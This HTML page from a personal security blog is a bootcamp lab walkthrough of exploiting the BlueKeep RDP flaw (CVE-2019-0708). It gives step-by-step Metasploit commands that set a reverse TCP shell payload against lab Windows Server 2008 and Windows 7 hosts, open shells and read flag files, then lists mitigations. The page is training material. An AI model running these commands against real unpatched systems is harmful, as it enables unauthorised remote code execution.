<!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link
          rel="stylesheet"
          href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
        />
        <meta name="generator" content="CherryTree">
        <!-- <link rel="stylesheet" href="../css/styles3.css" type="text/css" /> -->
        <link rel="stylesheet" href="../css/vulnerability.styles.css">
        <link rel="stylesheet" href="../css/main.css" />
        <script src="../static/js/script3.js"></script>
        <title>VULNERABILITY ASSESSMENT</title>
      </head>
      <body>
        <header id="navbar">
          <nav>
            <div id="brand">
              <img id="logo"  src="../static/images/mwas.jpeg" alt="" />
              <h1 id="my-name">5H311R4D!!</h1>
            </div>
            <ul id="nav-items">
              <li class="nav-link"><a href="../index.html"> Home</a></li>
              <li class="nav-link"><a href="../about.html"> About</a></li>
              <li class="nav-link"><a href="../contact.html"> Contact</a></li>
              <li class="nav-link" id="social-icon">
                <a href="https://github.com/shellradi" target="_blank">
                  <i class="fa fa-github"></i
                ></a>
                <a href="https://twitter.com/5H311R4Di" target="_blank">
                  <i class="fa fa-twitter"></i
                ></a>
                <a
                  href="https://www.linkedin.com/in/meshack-mwala-621603153/"
                  target="_blank"
                >
                  <i class="fa fa-linkedin"></i
                ></a>
              </li>
            </ul>
          </nav>
        </header>
        <section>
          <div class='page'><h1 class='title' style="margin-top: 12px;">## VULNERABILITY ASSESSMENT ##</h1><br/><br /><br /><h1>SUMMARY</h1><span style="indent:2;"><br /><br /><br /></span><em><span style="indent:2;">I happened to be a trainer @isaca kenya chapter for inter-varsity bootcamp <br />alongside @emilymuraguli a security reseacher from GT bank kenya on <br />vulnerability scanning and exploitation labs hosted by @cyberranges platform.<br />This is a walkthrough on exploiting bluekeep windows vulnerability with<br />metasploits meterpreter payload on cyber ranges.<br /> <br /> </span></em><span style="indent:2;"><br /> <br /> </span><a href=""><img src="../static/images/1-1.png" style="border-radius: 12px; margin: auto;"  alt="../static/images/1-1.png" /></a><br /><br /><br /> BlueKeep (CVE-2019-0708) exists within the Remote Desktop Protocol (RDP)<br /> used by the Microsoft Windows OSs listed below<br /><br />   •  Windows 2000VULNERABILITY<br />   •  Windows Vista<br />   •  Windows XP<br />   •  Windows 7<br />   •  Windows Server 2003<br />   •  Windows Server 2003 R2<br />   •  Windows Server 2008<br />   •  Windows Server 2008 R2<br /><br /> RDP protocal - is basically an online computer (physical computer) located in any<br />                       location in the world that you can access it with remote desktop<br />                       connection software.<br /><br /> meterpreter- advanced payload in metasploit than can perform a spefic function.<br />                      Its dynamic in nature so it can be scripted on the fly.<br />                      Its incredibly steathy since it lives in the memory of the target<br />                      and its extremely hard to detect or trace using forensic tools.<br /><br /><br /> An attacker can exploit this vulnerability to perform remote code execution<br />  on an unprotected system.<br /> An attacker can send specially crafted packets to one of these operating <br /> systems that has RDP enabled.<br /> After successfully sending the packets, the attacker would have the ability <br /> to perform a number of actions: <br />     <br />    • establishing an encrypted communication between your system and the<br />      target<br />      <br />      • Dump password hashes from the target system <br />       <br />      • Search for files on the target system <br />      <br />      •  upload files <br />      <br />      • take webcam  shots.<br />      <br />      <br /> This exploit, which requires no user interaction, must occur before authentication<br />         to be successful.<br /><br /> BlueKeep is considered “wormable” because malware exploiting this vulnerability on <br /> a system could propagate to other vulnerable systems; thus, a BlueKeep exploit<br /> would be capable of rapidly spreading in a fashion similar to the WannaCry malware<br /> attacks of 2017.<br /><br /><br />So lets exploit Bluekeep with metasploit  to get shell and find a flags on the<br />targets below.<br /><span style="background-color:#1e90ff;">(Flag format is flag{}, you&#39;ll know it when you see it ).</span><br /><br /><br /><h2> Targets</h2><br /> <br />   1.Windows server 2008 -(remoteserver) 192.168.125.100<br />                       target 1<br />   <br />   2.Wndows7 - (RemoteClient) 192.168.125.105<br />                        target 2<br />   <br />   <br />   <a href=""><img src="../static/images/1-2.png" alt="../static/images/1-2.png" /></a><br /><br /><br /><br /><h3>Objectives</h3><br /><br />  1 Launch services and open web shell or SSH into attacker machine <br />     with open vpn. I will use web shell for this case.<br />     <br />     <br />     <a href=""><img src="../static/images/1-3.png" alt="../static/images/1-3.png" /></a><br />     <br />     <br />     <br />   <br /><br />  2.Exploit BlueKeep vulnerability using metasploit to gain admin access on the two systems.<br />   <br /><br />   <strong><span style="text-decoration:underline;">Windows Server 2008</span></strong>:<br /><br />  Fire metasploit<br />  <br />  <div class="codebox"><div class="codebox">msfconsole</div></div><br />  <br />  this command launches metasploit:<br />  <br />  <a href=""><img src="../static/images/1-4.png" alt="../static/images/1-4.png" /></a><br />  <br />  <br />  <div class="codebox"><div class="codebox">search&nbsp;bluekeep</div></div><br />  <br />  this command returns two exploits <br />  <br />  <a href=""><img src="../static/images/1-5.png" alt="../static/images/1-5.png" /></a><br />  <br />  <br />  the command below uses the second exploit<br />  <br />  <div class="codebox"><div class="codebox">use&nbsp;exploit<span style="color:#ff9d00;font-weight:700">/</span>windows<span style="color:#ff9d00;font-weight:700">/</span>rdp<span style="color:#ff9d00;font-weight:700">/</span>cve_2019_0708_bluekeep_rce</div></div><br />  <br />  <a href=""><img src="../static/images/1-6.png" alt="../static/images/1-6.png" /></a><br />  <br />  the exploit is activated as seen in the red color<br />  <br />  <div class="codebox"><div class="codebox"><span style="color:#ff9d00;font-weight:700">info</span></div></div><br />  <br />the command above gives more information about the exploit we selected<br /><br /><br /><br /><br /><div class="codebox"><div class="codebox"><span style="color:#ff9d00;font-weight:700">set</span>&nbsp;RHOSTS&nbsp;192.168.125.100<br /><span style="color:#ff9d00;font-weight:700">set</span>&nbsp;LHOSTS&nbsp;192.168.125.110<br /><span style="color:#ff9d00;font-weight:700">set</span>&nbsp;LPORT&nbsp;4444<br /><span style="color:#ff9d00;font-weight:700">set</span>&nbsp;RPORT&nbsp;3389<br /><span style="color:#ff9d00;font-weight:700">set</span>&nbsp;payload&nbsp;windows<span style="color:#ff9d00;font-weight:700">/</span>x64<span style="color:#ff9d00;font-weight:700">/</span>shell<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp<br /><span style="color:#ff9d00;font-weight:700">set</span>&nbsp;TARGET&nbsp;1<br />show&nbsp;options<br />show&nbsp;targets</div></div><br /><br />the commands above sets remote (windows server),<br />local host (attacker), local port,remote<br />port, the payload and the target respectively.<br /><br />Then <span style="background-color:#000000;">show option </span>command indicates <br />if all required options for the exploit <br />have been met, <br /><br /><span style="background-color:#000000;">show target </span>will indicate if the target <br />that has been set to 1.<br /><br /><br /><br /><br /><a href=""><img src="../static/images/1-7.png" alt="../static/images/1-7.png" /></a><br /><br /><br /><br /><div class="codebox"><div class="codebox">exploit<br />run</div></div><br />any of the two commands tries to get a shell by <br />exploting the vulnerability<br /><br /><br /><a href=""><img src="../static/images/1-8.png" alt="../static/images/1-8.png" /></a><br /><br /><br /><br /><span style="color:#000000;background-color:#00ff00;">woop woop we get a shell.</span><span style="indent:2;"><br /><br /><br /></span><a href=""><img src="../static/images/1-9.png" alt="../static/images/1-9.png" /></a><br /><br />remember the challenge is to get flag<br />in administrators desktop<br /><br /><br /><div class="codebox"><div class="codebox"><span style="color:#ff9d00;font-weight:700">dir</span><br /><span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>users<span style="color:#ff9d00;font-weight:700">/</span>administrator<span style="color:#ff9d00;font-weight:700">/</span>desktop<br /><span style="color:#ff9d00;font-weight:700">dir</span><br />Type&nbsp;flag.txt</div></div><br /><br /><br />once in the shell type dir to view files and directories,<br />then navigate to the adminstrators desktop folder.<br /><br /><a href=""><img src="../static/images/1-10.png" alt="../static/images/1-10.png" /></a><br /><br /><br /><br />use the dir command command to view files, you notice<br />a file called flag.txt<br /> <br /> <span style="background-color:#000000;">Type flag.txt</span><br /> <br /> <a href=""><img src="../static/images/1-11.png" alt="../static/images/1-11.png" /></a><br /> <br /> <span style="color:#000000;background-color:#00ff00;">woop woop you have flag.</span><br /> <br /> <br /><br /><br />  <strong><span style="text-decoration:underline;">WINDOWS 7</span></strong><br />  <br />  For this host repeat the same process but remember to<br />  change the remote host to windoes 7 (192.168.125.105) and the<br />  target to 2.<br />  <br />  <br />   <br />  <br />  <div class="codebox"><div class="codebox"><span style="color:#ff9d00;font-weight:700">set</span>&nbsp;RHOSTS&nbsp;192.168.125.105<br /><span style="color:#ff9d00;font-weight:700">set</span>&nbsp;LHOSTS&nbsp;192.168.125.110<br /><span style="color:#ff9d00;font-weight:700">set</span>&nbsp;LPORT&nbsp;4444<br /><span style="color:#ff9d00;font-weight:700">set</span>&nbsp;RPORT&nbsp;3389<br /><span style="color:#ff9d00;font-weight:700">set</span>&nbsp;payload&nbsp;windows<span style="color:#ff9d00;font-weight:700">/</span>x64<span style="color:#ff9d00;font-weight:700">/</span>shell<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp<br /><span style="color:#ff9d00;font-weight:700">set</span>&nbsp;TARGET&nbsp;2<br />show&nbsp;options<br />show&nbsp;targets<br />exploit<br /></div></div><br />  <br />  <br />  <a href=""><img src="../static/images/1-12.png" alt="../static/images/1-12.png" /></a><br />  <br />  <br />  <br /><span style="color:#000000;background-color:#00ff00;">  woop woop we get a shell</span><br />  <br />  <br />  <br />  <a href=""><img src="../static/images/1-13.png" alt="../static/images/1-13.png" /></a><br />  <br />  <br />  <br />  the challenge still remains get flag in the adminstrators desktop<br />  <br />  <br />  <a href=""><img src="../static/images/1-14.png" alt="../static/images/1-14.png" /></a><br />  <br />  <br />  locate and navigate to the administartors desktop and show files<br />  <br />  <br />  <br />  <div class="codebox"><div class="codebox"><span style="color:#ff9d00;font-weight:700">dir</span><br /><span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>users<span style="color:#ff9d00;font-weight:700">/</span>administrator<span style="color:#ff9d00;font-weight:700">/</span>desktop<br /><span style="color:#ff9d00;font-weight:700">dir</span><br />Type&nbsp;flag.txt</div></div><br />  <br />  you will see a file named flag.txt<br />  <br />  <br />  <a href=""><img src="../static/images/1-15.png" alt="../static/images/1-15.png" /></a><br />  <br /> <span style="background-color:#000000;"> Type flag.txt</span><br />  <br />  <br />  <a href=""><img src="../static/images/1-16.png" alt="../static/images/1-16.png" /></a><br /><br />  <span style="color:#000000;background-color:#00ff00;">woop woop we have the flag</span><br />  <br />  <br />  kudos you managed the labs.<br /><br /><br /><br />  <br /><br />  MIGATIONS<br /><br />   • Install available patches- Microsoft has released security updates to patch this vulnerability,<br />      microsoft has also released patches for a number of OSs that are no longer officially supported, <br />      including Windows Vista, Windows XP, and Windows Server 2003 and<br />      as always, adminstators should test patches before installing.<br /><br />   • For OSs that do not have patches or systems that cannot be patched, <br />     other mitigation steps can be used to help protect against BlueKeep.<br /><br />   • Upgrade end-of-life (EOL) OSs. Consider upgrading any EOL OSs no longer <br />      supported by Microsoft to a newer, supported OS, such as Windows 10.<br />    <br />   • Disable unnecessary services. Disable services not being used by the OS,<br />     this best practice limits exposure to vulnerabilities.<br /><br />   • Enable Network Level Authentication. Enable Network Level Authentication <br />      in Windows 7, Windows Server 2008, and Windows Server 2008 R2.<br />      Doing so forces a session request to be authenticated and effectively <br />      mitigates against BlueKeep, as exploit of the vulnerability requires<br />      an unauthenticated session.<br />    <br />   • Block Transmission Control Protocol (TCP) port 3389 at the enterprise perimeter firewall.<br />      Because port 3389 is used to initiate an RDP session,<br />     blocking it prevents an attacker from exploiting BlueKeep from outside the user’s network. <br />     However, this will block legitimate RDP sessions and may not prevent unauthenticated sessions <br />     from being initiated inside a network.<br /><br /><span style="background-color:#ff0000;">  note</span><br /><br /> Bluekeep is a RDP vulnerability :- (vulnerabilities allow an unauthenticated adversary to pull off remote code execution on a server running RDS.    <br /> <span style="background-color:#ff0000;">In plain words, these vulnerabilities can put the whole enterprise network at risk. The only rescue is to apply software updates with patches once   they are available)</span>.<br /> <br />below is the whole presentation on scanning and exploiting vulnerabilities.<br /> <table style="display:inline-table"><tr><td><a href="../##_VULNERABILITY_ASSESSMENT_##_HTML/EmbeddedFiles/1-ISACA Scanning Lab.pptx">Linked file: ISACA Scanning Lab.pptx </a></td></tr></table><br /> <br /></div>
        </section>
      </body>
    </html>